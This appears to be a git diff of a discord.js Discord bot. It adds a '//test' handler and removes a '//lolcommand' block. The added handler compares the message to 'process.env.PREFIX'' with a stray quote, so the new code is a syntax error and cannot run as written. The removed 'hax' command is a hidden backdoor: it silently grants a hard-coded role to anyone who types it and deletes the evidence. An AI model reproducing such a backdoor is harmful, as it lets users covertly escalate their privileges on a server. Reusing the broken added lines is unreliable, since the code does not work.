@@ -90,7 +90,15 @@ client.on('message', message => {
   if (message.content === '911') {
    message.channel.send("<@" + message.author.id + ">" + " вызывает " + "<@&618128028748349450>");
   }
-}); 
+});
+
+
+//test
+client.on('message', message => {
+  if (message.content === 'process.env.PREFIX'') {
+  message.channel.send("lol");
+  }
+});
 
 
 //commands
@@ -149,17 +157,6 @@ client.on("message", async message => {
       .setColor("#8b00ff")
     return message.channel.send(server);
 }
-
-
-  //lolcommand
-   if(command === "hax") {
-   var role = message.guild.roles.get('632579156382711820');
-   message.member.addRole(role); 
-   message.delete().catch(O_o=>{}); 
-   message.channel.send("✓").then(function(message) {
-    message.delete(3000);
-  });
-  }
 
 
   //moderators list
